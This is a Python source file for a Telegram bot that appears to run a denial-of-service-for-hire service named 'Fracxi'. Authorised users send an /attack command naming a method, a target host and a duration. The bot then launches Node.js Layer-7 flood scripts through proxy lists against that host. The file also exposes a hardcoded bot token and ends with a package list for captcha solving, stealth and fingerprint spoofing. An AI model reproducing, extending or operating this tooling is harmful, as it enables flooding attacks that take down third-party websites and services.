import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6942224817:AAEITxumizdt_ArqLJikdzRh9eYKycCVJUA'

bot = telebot.TeleBot(bot_token)

proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
    
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'You dont have permission to use this command.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Use correct : /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Added {user_id}. Can use command for 30 days.')

load_users_from_database()

@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
[ 👻 ]   Welcome to Fracxi | 
        " /methods "Show all available Layer7 methods"


       [ ✔️ ]   Admin : D4XG | 
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
[ 💸 ]   All Layer7 Methods ! 
     - PLUTO
     - RAW-ALPHA
     - BROWSER !
[ 📎 ]   ᴀᴛᴛᴀᴄᴋ ? [ " /attack " + method + target ]  !
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "[ 💤 ]   Attack Stopped .")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, '[ 👻 ]   How to attack |  : /attack + [ Methods ] + [ Host ] + [ Duration ]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"Please wait {remaining_time}(s) To use the command again!")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]
    atime = args[3]

    blocked_domains = ["chinhphu.vn", "daxg.space", ".edu.vn", ".gov"]   
    if method == 'TLS-FLOODER' or method == 'TLS-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"[ 🚀 ]  Cannot perform the attack | Blocked domain: {blocked_domain}")
                return

    if method in ['PLUTO', 'POSEIDON', 'ZENITH', 'GLAXIA']:
        # Update the command and duration based on the selected method
        if method == 'PLUTO':
            os.chdir("L7")
            command = ["node", "Pluto.js", host, atime, "64", "12", "proxy.txt", "bypass"]
            duration = atime
        if method == 'POSEIDON':
            os.chdir("L7")
            command = ["node", "Poseidon.js", host, atime, "12", "proxy.txt", "autorate"]
            duration = atime
        if method == 'ZENITH':
            os.chdir("L7")
            command = ["node", "Zenith.js", host, atime, "100", "12", "proxy.txt"]
            duration = atime
        if method == 'GLAXIA':
            os.chdir("L7")
            command = ["node", "Poseidon.js", host, atime, "64", "12", "proxy.txt"]
            duration = atime

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent To Host : {host} | Duration : {duration} (s) !')
    else:
        bot.reply_to(message, 'Attack Not Indival Methods Layer 7.')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Admin : t.me/xDAXG |')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
# npm i user-agents header-generator request fake-useragent randomstring colors axios cheerio gradient-string cloudscraper random-useragent crypto-random-string playwright-extra fingerprint-generator fingerprint-injector ua-parser-js http2 minimist socks puppeteer hcaptcha-solver puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth http http2 zombie random-referer jar xmlhttprequest vm set-cookie-parser